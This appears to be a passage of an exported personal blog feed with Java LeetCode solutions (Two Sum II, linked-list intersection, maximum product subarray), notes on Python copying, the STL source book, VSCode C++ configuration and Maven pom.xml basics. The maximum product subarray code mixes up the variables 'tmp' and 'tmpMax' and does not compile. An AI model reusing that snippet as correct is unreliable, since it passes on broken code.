<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: numbers = [2,7,11,15], target = 9</span><br><span class="line">Output: [1,2]</span><br><span class="line">Explanation: The sum of 2 and 7 is 9. Therefore index1 = 1, index2 = 2.</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Given an array of integers that is already sorted in ascending order,</span></span><br><span class="line"><span class="comment"> * find two numbers such that they add up to a specific target number.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The function twoSum should return indices of the two numbers</span></span><br><span class="line"><span class="comment"> * such that they add up to the target,</span></span><br><span class="line"><span class="comment"> * where index1 must be less than index2.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/two-sum-ii-input-array-is-sorted/description/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 一种最简单的方法和Q1TwoSum一样，利用hashtable来处理。代码是一摸一样的。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 另一种方法是利用两个指针，慢慢逼近所求值，算是非常巧妙的办法了。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Q167TwoSumII</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] twoSumHashMap(<span class="keyword">int</span>[] numbers, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        HashMap&lt;Integer, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numbers.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.containsKey(numbers[i])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;map.get(numbers[i]), i+<span class="number">1</span>&#125;;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                map.put(target - numbers[i] , i+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"NO SOLUTION"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] twoSumTwoPointers(<span class="keyword">int</span>[] numbers, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>, right = numbers.length-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (numbers[left] + numbers[right] != target) &#123;</span><br><span class="line">            <span class="keyword">if</span> (numbers[left] + numbers[right] &gt; target ) &#123;</span><br><span class="line">                right--;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;left+<span class="number">1</span>, right+<span class="number">1</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
            <tag> Two Pointers </tag>
            
            <tag> Binary Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[谈谈Python中的拷贝]]></title>
      <url>/wiki/2017/10/30/Python-%E8%B0%88%E8%B0%88Python%E4%B8%AD%E7%9A%84%E6%8B%B7%E8%B4%9D/</url>
      <content type="html"><![CDATA[<h2 id="可变和不可变对象"><a href="#可变和不可变对象" class="headerlink" title="可变和不可变对象"></a>可变和不可变对象</h2><p>为了解释Python中的拷贝，首先要弄清楚Python中的对象分为可变和不可变对象。在Python中的每一个对象都可以分为不可变<code>immutable</code>或者可变<code>mutable</code>。对于Python核心数据类型，其分类如下：</p>
<ul>
<li>可变： 列表，字典</li>
<li>不可变： 数字，字符串，元组</li>
</ul>
<h2 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h2><p>赋值并不拷贝。</p>
<p><strong>Assignment statements in Python do not copy objects</strong>, they create bindings between a target and an object. For collections that are mutable or contain mutable items, a copy is sometimes needed so one can change one copy without changing the other.(<a href="https://docs.python.org/3.6/library/copy.html#module-copy">Python官方文档</a>)</p>
<h2 id="深拷贝和浅拷贝"><a href="#深拷贝和浅拷贝" class="headerlink" title="深拷贝和浅拷贝"></a>深拷贝和浅拷贝</h2><p>来自<code>copy</code>模块的两个函数</p>
<ul>
<li><p><code>copy.copy()</code> 浅拷贝</p>
</li>
<li><p><code>copy.deepcopy()</code> 深拷贝</p>
</li>
</ul>
<p>The difference between shallow and deep copying is only relevant for <strong>compound objects</strong> (objects that contain other objects, like lists or class instances):</p>
<p>A <strong>shallow copy</strong> constructs a new compound object and then (to the extent possible) inserts references into it to the objects found in the original.<br>A <strong>deep copy</strong> constructs a new compound object and then, recursively, inserts copies into it of the objects found in the original.</p>
<h2 id="常见类型拷贝"><a href="#常见类型拷贝" class="headerlink" title="常见类型拷贝"></a>常见类型拷贝</h2><ul>
<li>dict.copy()  返回一个字典的浅复制。</li>
<li>list.copy() 返回一个列表的浅复制。</li>
</ul>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Python </tag>
            
            <tag> Copy </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[STL源码剖析]]></title>
      <url>/wiki/2017/10/30/C-STL%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90/</url>
      <content type="html"><![CDATA[<p>《STL源码剖析》这本书可以作为深入学习C++ STL的伴侣，毕竟并不是所有人都可以流畅地阅读STL源码的。这本书非常详细的剖析了STL源码：它对源码中重要的代码都做了详细的注释，而对于复杂的、难以理解的内容，作者也做了不少图解。</p>
<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>学习之前，当然是先看看源码了。在mac上，LLVM附带的C++的STL(Standard Template Library)位于：</p>
<p><code>/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/include/c++/v1/</code></p>
<p>另外，STL源码剖析推荐的SGI STL可以在<a href="https://github.com/karottc/sgi-stl">GITHUB</a>下载，其<a href="https://community.hpe.com/t5/Servers-The-Right-Compute/SGI-com-Tech-Archive-Resources-now-retired/ba-p/6992583#.W0KS_baPCAx">官方网站</a>不再提供下载。</p>
]]></content>
      
        <categories>
            
            <category> C++ </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Cpp </tag>
            
            <tag> STL </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[160. Intersection of Two Linked Lists]]></title>
      <url>/wiki/2017/10/30/Leetcode-160-Intersection-of-Two-Linked-Lists/</url>
      <content type="html"><![CDATA[<p>Write a program to find the node at which the intersection of two singly linked lists begins.</p>
<p>For example, the following two linked lists:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A:          a1 → a2</span><br><span class="line">                   ↘</span><br><span class="line">                     c1 → c2 → c3</span><br><span class="line">                   ↗            </span><br><span class="line">B:     b1 → b2 → b3</span><br></pre></td></tr></table></figure>
<p>begin to intersect at node c1.</p>
<p>Notes:</p>
<ul>
<li>If the two linked lists have no intersection at all, return null.</li>
<li>The linked lists must retain their original structure after the function returns.</li>
<li>You may assume there are no cycles anywhere in the entire linked structure.</li>
<li>Your code should preferably run in O(n) time and use only O(1) memory.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Write a program to find the node at which the intersection of two singly linked lists begins.</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/intersection-of-two-linked-lists/description/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Notes:</span></span><br><span class="line"><span class="comment"> *   Your code should preferably run in O(n) time and use only O(1) memory.</span></span><br><span class="line"><span class="comment"> *   If the two linked lists have no intersection at all, return null.</span></span><br><span class="line"><span class="comment"> *   The linked lists must retain their original structure after the function returns.</span></span><br><span class="line"><span class="comment"> *   You may assume there are no cycles anywhere in the entire linked structure.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Solution: Two Pointers</span></span><br><span class="line"><span class="comment"> *   使用两个指针，每个指针指向一个链表头部。</span></span><br><span class="line"><span class="comment"> *   然后使用指针遍历链表，达到链表尾部后，遍历另一个链表，直到链表尾部。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   如果存在交叉，那么这两个指针在第二次遍历以后肯定会相遇。即pointA = pointB，</span></span><br><span class="line"><span class="comment"> *   如果直到遍历结束，还没有相遇，即没有交叉。题目不要求一定相交。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Complexity Analysis</span></span><br><span class="line"><span class="comment"> *   Time complexity : O(m+n)O(m+n).</span></span><br><span class="line"><span class="comment"> *   Space complexity : O(1)O(1).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Q160IntersectionOfTwoLinkedLists</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ListNode <span class="title">getIntersectionNode</span><span class="params">(ListNode headA, ListNode headB)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (headA == <span class="keyword">null</span> || headB == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ListNode posA = headA, posB = headB;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// trick: The number of iteration will be at most one.</span></span><br><span class="line">        <span class="comment">// If the two linked lists have no intersection at all,</span></span><br><span class="line">        <span class="comment">// posA and posA will be null at the same time,</span></span><br><span class="line">        <span class="comment">// and then jump out of the iteration to return a null.</span></span><br><span class="line">        <span class="keyword">while</span> (posA != posB) &#123;</span><br><span class="line">            posA = (posA == <span class="keyword">null</span>)? headB : posA.next;</span><br><span class="line">            posB = (posB == <span class="keyword">null</span>)? headA : posB.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> posA;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Two Pointers </tag>
            
            <tag> Linked List </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[VSCode]]></title>
      <url>/wiki/2017/10/30/TOOLS-VSCODE/</url>
      <content type="html"><![CDATA[<p>Vscode(Visual Studio Code)是一个轻量且强大的代码编辑器。内置JavaScript、TypeScript和Node.js支持，而且拥有丰富的插件生态系统，可通过安装插件来支持C++、C#、Python、PHP等其他语言。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/vscode_demo.png" alt="vscode界面"></p>
<h2 id="C-的使用"><a href="#C-的使用" class="headerlink" title="C++的使用"></a>C++的使用</h2><p>在Vscode中使用C++语言进行编译和调试之前，需要安装一些额外的工具、配置一些文件。</p>
<h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><p>　　打开VScode后，按下组合键“⇧⌘X”，打开扩展，输入<code>C/C++</code>，安装<code>C/C++</code>、<code>C/C++ Clang Command Adapter</code>，安装完成后，重启VScode让插件生效。</p>
<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>两个配置文件在当前工作目录的<code>.vscode</code>隐藏文件夹下。</p>
<p><code>launch.json</code>配置文件(下拉菜单 Debug- Open/Add Configuration)，用于调试程序</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"version"</span>: <span class="string">"0.2.0"</span>,</span><br><span class="line">    <span class="string">"configurations"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"name"</span>: <span class="string">"(lldb) Launch"</span>,  <span class="comment">// 配置名称，将会在启动配置的下拉菜单中显示</span></span><br><span class="line">            <span class="string">"type"</span>: <span class="string">"cppdbg"</span>,  <span class="comment">// 配置类型，这里只能为cppdbg</span></span><br><span class="line">            <span class="string">"request"</span>: <span class="string">"launch"</span>, <span class="comment">// 请求配置类型，可以为launch（启动）或attach（附加）</span></span><br><span class="line">            <span class="string">"program"</span>: <span class="string">"$&#123;workspaceFolder&#125;/tsh"</span>, <span class="comment">// 将要进行调试的程序的路径</span></span><br><span class="line">            <span class="string">"args"</span>: [], <span class="comment">// 程序调试时传递给程序的命令行参数，一般设为空即可</span></span><br><span class="line">            <span class="string">"stopAtEntry"</span>: <span class="literal">false</span>, <span class="comment">// 设为true时程序将暂停在程序入口处，可以设置为true</span></span><br><span class="line">            <span class="string">"cwd"</span>: <span class="string">"$&#123;workspaceFolder&#125;"</span>, <span class="comment">// 调试程序时的工作目录</span></span><br><span class="line">            <span class="string">"environment"</span>: [],   <span class="comment">// （环境变量）</span></span><br><span class="line">            <span class="string">"externalConsole"</span>: <span class="literal">true</span>, <span class="comment">// 调试时是否显示控制台窗口，一般设置为true显示控制台</span></span><br><span class="line">            <span class="string">"MIMode"</span>: <span class="string">"lldb"</span>,  <span class="comment">// 指定连接的调试器，可以为gdb或lldb。</span></span><br><span class="line">            <span class="string">"preLaunchTask"</span>: <span class="string">"compile"</span> </span><br><span class="line">            <span class="comment">// 调试会话开始前执行的任务，一般为编译程序。与tasks.json的label相对应</span></span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">"compounds"</span>: [],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>tasks.json</code> 配置文件(下拉菜单Tasks-configure Tasks)，用于编译程序</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    // See https://go.microsoft.com/fwlink/?LinkId=733558</span><br><span class="line">    // for the documentation about the tasks.json format</span><br><span class="line">    "version": "2.0.0",</span><br><span class="line">    "tasks": [</span><br><span class="line">        &#123;</span><br><span class="line">            "label": "compile", // 任务名称，与launch.json的preLaunchTask相对</span><br><span class="line">            "type": "shell",</span><br><span class="line">            "command": "make", // 编译命令，g++/make 等</span><br><span class="line">            "group": &#123;</span><br><span class="line">                "kind": "build",</span><br><span class="line">                "isDefault": true</span><br><span class="line">            &#125;,</span><br><span class="line">            "problemMatcher":"$gcc"</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="更简单的方法"><a href="#更简单的方法" class="headerlink" title="更简单的方法"></a>更简单的方法</h3><p>安装 Code Runner 这个插件，不用进行任何配置就能直接编译并运行(Control+Option+N)，默认情况下使用的是GCC和G++。</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/vscode-runcoder.png" alt="vscode-runcoder"></p>
]]></content>
      
        <categories>
            
            <category> TOOLS </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Editor </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[152. Maximum Product Subarray]]></title>
      <url>/wiki/2017/10/30/Leetcode-152-Maximum-Product-Subarray/</url>
      <content type="html"><![CDATA[<p>Given an integer array <code>nums</code>, find the contiguous subarray within an array (containing at least one number) which has the largest product.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [2,3,-2,4]</span><br><span class="line">Output: 6</span><br><span class="line">Explanation: [2,3] has the largest product 6.</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: [-2,0,-1]</span><br><span class="line">Output: 0</span><br><span class="line">Explanation: The result cannot be 2, because [-2,-1] is not a subarray.</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目非常像LeetCode 53. Maximum Subarray，在Q53中给出连续子数组的最大和，这里要求给出连续子数组的最大乘积。所以想办法把kadane算法改编一下。但是这里的整数可能是负数，也就是说原先为负最小的乘积，在乘以一个负数以后，可能会变最大乘积值。所以还要计算连续子数组的最小乘积。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProduct</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nums == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span>  maxSoFar = nums[<span class="number">0</span>], maxEndingHere = nums[<span class="number">0</span>], minSoFar = nums[<span class="number">0</span>], minEndingHere = nums[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">int</span> tmpMax;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        tmp = maxEndingHere;</span><br><span class="line">        maxEndingHere = Math.max(minEndingHere*nums[i], </span><br><span class="line">            Math.max(maxEndingHere*nums[i], nums[i]));</span><br><span class="line">        minEndingHere = Math.min(tmpMax*nums[i], </span><br><span class="line">            Math.min(minEndingHere*nums[i], nums[i]));</span><br><span class="line">        maxSoFar = Math.max(maxSoFar, maxEndingHere);</span><br><span class="line">        minSoFar = Math.min(minSoFar, minEndingHere);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> maxSoFar;        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> LintCode </tag>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Array </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Maven]]></title>
      <url>/wiki/2017/10/30/TOOLS-Maven/</url>
      <content type="html"><![CDATA[<p>Maven is a build tool which automatically manages dependencies, source C compilation, test compilation, and test execution.</p>
<h2 id="Compiling-with-Maven-from-the-Command-Line"><a href="#Compiling-with-Maven-from-the-Command-Line" class="headerlink" title="Compiling with Maven from the Command Line"></a>Compiling with Maven from the Command Line</h2><p>If you wish to compile the source C using Maven from the command line, simply issue the following command from the command line from inside the root directory:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mvn compile</span><br></pre></td></tr></table></figure>
<h2 id="Compiling-with-Maven-from-IntelliJ"><a href="#Compiling-with-Maven-from-IntelliJ" class="headerlink" title="Compiling with Maven from IntelliJ"></a>Compiling with Maven from IntelliJ</h2><p>Go to <code>File &gt; New &gt; Project from Existing Sources...</code> and select the root directory. You should receive an “Import Project” prompt like the one shown below. Select the “Import project from external model” radio button, select “Maven” from the list below, and click through the following prompts to complete the import.</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/maven_import_project.png" alt="maven_import_project"></p>
<p>Open the Maven Projects pane by navigating to “View &gt; Tool Windows &gt; Maven Projects”.</p>
<p><img src="http://or9a8nskt.bkt.clouddn.com/maven project.png" alt="maven project"></p>
<h2 id="一个基本maven项目的pom-xml配置"><a href="#一个基本maven项目的pom-xml配置" class="headerlink" title="一个基本maven项目的pom.xml配置"></a>一个基本maven项目的pom.xml配置</h2><p>第一部分,项目坐标，信息描述等</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.company.project<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>module<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>test Maven Webapp<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.apache.org<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>modelVersion：pom文件的模型版本</li>
</ul>
<p>关于group id和artifact id，为了便于多人多模块协同开发管理（以后会讲），建议使用以下命名规范</p>
<ul>
<li>group id：com.公司名.项目名</li>
<li><p>artifact id：功能模块名</p>
</li>
<li><p>packaging：项目打包的后缀，war是web项目发布用的，默认为jar</p>
</li>
<li>version: artifact模块的版本</li>
<li>name和url：相当于项目描述，可删除</li>
<li>group id + artifact id +version :项目在仓库中的坐标</li>
</ul>
<p>第二部分,引入jar包</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-csv<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>上面引入了Apache commons csv项目，可以在<a href="http://commons.apache.org/proper/commons-csv">官网</a>找到Maven设置。</p>
<ul>
<li>dependency：引入资源jar包到本地仓库，要引入更多资源就在<dependencies>中继续增加<dependency></li>
<li>group id+artifact id+version：资源jar包在仓库中的坐标</li>
<li>scope：作用范围，test指该jar包仅在maven测试时使用，发布时会忽略这个包。需要发布的jar包可以忽略这一配置</li>
</ul>
<p>第三部分,构建项目</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">finalName</span>&gt;</span>helloworld<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">source</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">target</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-resources-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">			<span 